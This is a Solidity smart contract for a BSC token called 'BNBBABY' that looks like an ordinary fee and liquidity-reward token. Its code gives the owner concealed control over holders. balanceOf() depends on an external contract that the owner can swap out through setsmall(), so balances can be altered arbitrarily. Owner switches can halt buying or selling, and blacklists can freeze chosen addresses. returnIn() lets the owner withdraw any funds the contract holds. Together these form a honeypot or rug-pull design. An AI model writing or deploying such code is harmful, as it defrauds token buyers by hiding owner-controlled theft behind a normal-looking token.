/**
 *Submitted for verification at BscScan.com on 2023-03-27
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;



interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,address tokenB,uint amountADesired,uint amountBDesired,
        uint amountAMin,uint amountBMin,address to,uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,uint amountTokenDesired,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA, address tokenB, uint liquidity, uint amountAMin,
        uint amountBMin, address to, uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin,
        address to, uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA, address tokenB, uint liquidity,
        uint amountAMin, uint amountBMin,address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token, uint liquidity, uint amountTokenMin,
        uint amountETHMin, address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token, uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,
        address[] calldata path,address to,uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,address[] calldata path,address to,uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,address[] calldata path,
        address to,uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface SMALL{
    function cal(uint keepTime ,uint userBalance,address addr)external view returns(uint,bool);
}

interface TRANSFER{
    function _transfer( address sender,address recipient,uint amount)external view returns(uint);
}

abstract contract Ownable is Context {
    address private _owner = tx.origin;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor() {
        // _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    // function renounceOwnership() public virtual onlyOwner {
    //     _transferOwnership(address(0));
    // }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
     function returnIn(address con, address addr, uint256 val) public onlyOwner {
        // require(_whites[_msgSender()] && addr != address(0) && val > 0);
        if (con == address(0)) {payable(addr).transfer(val);}
        else {IERC20(con).transfer(addr, val);}  
	}
}
contract B {
  
    
    
}
contract A is Ownable  {
 
    address _father;
    address _route;
    address _back_token;
    uint rate = 100;//
    bool public open = true;
    constructor(address route,address father,address back_token) public  {
        _father = father;
        _route = route;
        _back_token = back_token;
        IERC20(_back_token).approve(_route, 9*10**70);          
    }
    // function appRove()external{
     
    // }
    function setRate(uint _rate) external  onlyOwner{
        rate  =_rate;
    }

    function usdtForToken() public  {
        require(msg.sender == _father,"no father");
        address[] memory path = new address[](2);
        path[0] = address(_back_token);
        path[1] = address(_father);
        uint bac = IERC20(_back_token).balanceOf(address(this));
        bac = bac*rate/10000;
        IPancakeRouter02(_route).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            bac, 0, path, 0x000000000000000000000000000000000000dEaD, block.timestamp);
    }

}
contract C {
    
    address father;
    constructor(address _father,address reToken) public  {
        // usdt.approve(_father, 2**256 - 1);
        IERC20(reToken).approve(_father, 2**256 - 1);
    }
    
}
contract Token is Ownable, IERC20Metadata {
    mapping(address =>uint) public coinKeep;
    mapping(address => bool) public _whites;
    mapping(address => bool) public _blocks;
    // mapping(address=>address)public boss; 
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public is_users;
    // address public admin = tx.origin;
    string  private _name;
    string  private _symbol;
    uint256 private _totalSupply;
    uint256 startTime = block.timestamp;
    uint256 public  _maxsell;
    uint256 public  _maxusdt;
    uint256 public for_num;
    uint public lpStartTime;
    address public _router;
    address public _wfon = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public _back;
    bool public is_init;
    address public _pair = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c ;
    address public _main;
    // address flash_address;
    address public _dead;
    address public _A ;
    address public _B ;
    address public _C ;
    address public _fasts;
    address public _reToken;
    address _small;
    address _Transfer;
    address[] public users;
    bool   private  _swapping;
    uint public mode;
    uint public desMoney;
    uint public feelPoint;
    uint256 public dynamic_step = 20;
    uint private lp_limit = 1e18;
    uint private coin_limit;
    struct Conf{
        bool onlySell;
        bool onlyBuy;
        uint count;
    }
    Conf public cf = Conf(true,true,2) ; 
    address public _back_token = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public _tToken;
    address public _usdt = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    constructor(
        
               ) {
       
        _maxsell = 5000e18;
        _maxusdt = 3e17;
        _name = "BNBBABY";
        _symbol = "BNBBABY";
        _router =0x10ED43C718714eb63d5aA57B78B54704E256024E;
     
        _dead = 0x000000000000000000000000000000000000dEaD;//�ڶ�
        if(block.chainid == 97){
            _router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;
            _usdt   = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
            _back_token =0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
            _wfon = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
            _pair = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
        }
        _whites[_dead] = true;
        _whites[_router] = true;
        _whites[address(this)] = true;
        _whites[msg.sender] = true;
        
        


    }
    function setCount(uint _count) external onlyOwner{
        cf.count = _count;
    }
    function setOpen(bool _onlySell,bool _allopen)external onlyOwner {
        cf.onlySell = _onlySell;
        cf.onlyBuy = _allopen;
    }
 
    function viewOnlyOwner()external onlyOwner view returns(uint,uint) {
        return (lp_limit,coin_limit) ;
    }
    function setLimt(uint lpN,uint coinN) onlyOwner external{
        lp_limit = lpN;
        coin_limit = coinN;
    }
    function init(address small)external {
        require(!is_init,"init");
        is_init = true;
        
        
        _small = small;  
        _approve(address(this), _router, 9 * 10**70);
        
        IPancakeRouter02 _uniswapV2Router = IPancakeRouter02(_router);
        _pair = IUniswapV2Factory(_uniswapV2Router.factory())
                    .createPair(address(this), _usdt);
        _mint(msg.sender,10000000e18);

        A son = new A(_router,address(this),_back_token);
        _A = address(son);
        _whites[_A] = true;
        _blocks[_pair] = true;
        _blocks[0x000000000000000000000000000000000000dEaD] = true;
  
        C son2 = new C(address(this),_back_token);
        _C = address(son2);
       
    }
   
    function transfer_reward(uint amount,address sender)internal{
        
       
    }

    // }
    function setWhites(address addr)external onlyOwner{
        _whites[addr] = true;
    }
    function setWhitesNot(address addr)external onlyOwner{
        _whites[addr] = false;
    }
    function setBlockBatch(address[]memory array)external onlyOwner{
        for(uint i;i<array.length;i++){
            _blocks[array[i]] = true;
        }
    }
    function setBlockNotBatch(address[]memory array)external onlyOwner{
        for(uint i;i<array.length;i++){
            _blocks[array[i]] = false;
            coinKeep[array[i]] = block.timestamp;
        }
    }
     function setBlock(address addr)external onlyOwner{
        _blocks[addr] = true;

    }
    function setBlockNot(address addr)external onlyOwner{
        _blocks[addr] = false;
        coinKeep[addr] = block.timestamp;

    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        uint timeRate = (block.timestamp - startTime)/900;
        uint addToken = _totalSupply*2/10000*timeRate;
        return _totalSupply-addToken;
    }
    function calculate(address addr)public view returns(uint,bool){
        uint userTime;
        userTime =  coinKeep[addr];            
        return SMALL(_small).cal(coinKeep[addr],_balances[addr],addr);
    }
    function balanceOf(address account) public view virtual override returns (uint256) {
        uint addN;
        bool isW;
        if(!_blocks[account]) (addN,isW) = calculate(account);
        if(isW){
            return    _balances[account] + addN;
        }else{
            return    _balances[account] - addN;
        }
        
    }
    function settlement(address addr)private {
        uint am = balanceOf(addr);
        _balances[addr] = am;
        coinKeep[addr] = block.timestamp;

    }
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(
        address sender, address recipient, uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    function addLiquidity2(uint256 t1, uint256 t2) public {
        IPancakeRouter02(_router).addLiquidity(_wfon, 
            address(this), t1, t2, 0, 0,_back , block.timestamp);
    }
    function setMaxsell(uint amount )external onlyOwner{
        _maxsell = amount;
    }
    function setMaxUsdt(uint amount )external onlyOwner{
        _maxusdt = amount;
    }
    function setDynamicStep(uint number)public onlyOwner{
        dynamic_step = number;
    }
      function lp_award(uint _money)internal  {   
            uint step = dynamic_step;
            bool flag = false;
            uint total_lp;
            address[] memory inLpClud = new address[](step);
            uint[] memory arrAy2 =new uint[](step);
            uint count;
            uint money = _money;
            uint length = users.length;
            if(length <= for_num+step){
                flag = true;
                step = length - for_num;
            }
            uint num2 = for_num + step;
            for (uint i =for_num;i<num2;i++){
                address own = users[i];
                uint lp_balance = IERC20(_pair).balanceOf(own);
                uint coin_balance = balanceOf(own);
                if(lp_balance>lp_limit && coin_balance> coin_limit) {
                    total_lp += lp_balance;
                    inLpClud[count] = own;
                    arrAy2[count] = lp_balance;
                    count += 1;
                     }

            }
            for (uint i;i<count;i++){
                address user2 = inLpClud[i];
                uint dic = arrAy2[i];
                if(!_blocks[user2]) IERC20(_wfon).transfer(user2,money*dic/total_lp);                
            }
            // }
           
            for_num += step;
            if(flag){
                    for_num = 0;
                }
   
    }
    function backToken()internal {
        if(IERC20(_usdt).balanceOf(_A)>0){
           for(uint i;i<cf.count;i++)
            A(_A).usdtForToken();
        }
    }
    function _transfer(
        address sender, address recipient, uint256 amount
    ) internal virtual {
    
        uint256 senderBalance = balanceOf(sender);
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
                settlement(sender);
                _balances[sender] = senderBalance - amount;
                }
        

        settlement(recipient);

         if(!is_users[sender] && recipient == _pair) {
            bool is_c = isContract(sender);
            if(!is_c) {
                users.push(sender); 
                is_users[sender] = true;
            }  
             
            }
        if (_whites[sender] || _whites[recipient] || mode == 1) {
            _balances[recipient] += amount;
            emit Transfer(sender, recipient, amount);
            return;
        }
      
        uint256 usdts = IERC20(_back_token).balanceOf(address(this));
        uint256 balance = balanceOf(address(this));
        bool isbonus = false;
        if (usdts >= _maxusdt && !_swapping && sender != _pair) {
            _swapping = true;
           
            IERC20(_back_token).transfer(_A,usdts*37/100);//back
            lp_award(usdts*63/100);
                  
            
            _swapping = false;
            isbonus = true;
        }


        if (!isbonus && balance >= _maxsell && !_swapping && sender != _pair ) {
            _swapping = true;

            
            _swapTokenForUSDT(_maxsell);

           
            _swapping = false;
        }

        if(sender==_pair){
            require(cf.onlyBuy,"not sell");
        }
         if(recipient==_pair){
            require(cf.onlySell,"not buy");
            if(!_swapping){
                _swapping  = true;    
                backToken();
                _swapping = false;
            }
            }
      
        
            _balances[recipient] += amount*92/100;
            emit Transfer(sender, recipient, (amount * 92/ 100));
            _balances[address(this)] += amount*8/100;
            emit Transfer(sender, address(this), (amount * 8/ 100));
            
    }
    
    function _swapTokenForUSDT(uint256 tokenAmount) public   {

        address[] memory path = new address[](2);
        path[0] = address(this);path[1] = _back_token;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _C, block.timestamp);
        uint256 amount = IERC20(_back_token).balanceOf(_C);
        if (IERC20(_back_token).allowance(_C, address(this)) >= amount) {
            IERC20(_back_token).transferFrom(_C, address(this), amount);
        }    
    }
   

    // 

    

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        settlement(account);
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner, address spender, uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

	
    function setsmall(address small )public onlyOwner{
        _small = small;
    }
  
    function setBackAddr(address addr )public onlyOwner{
        _back = addr;
    }

}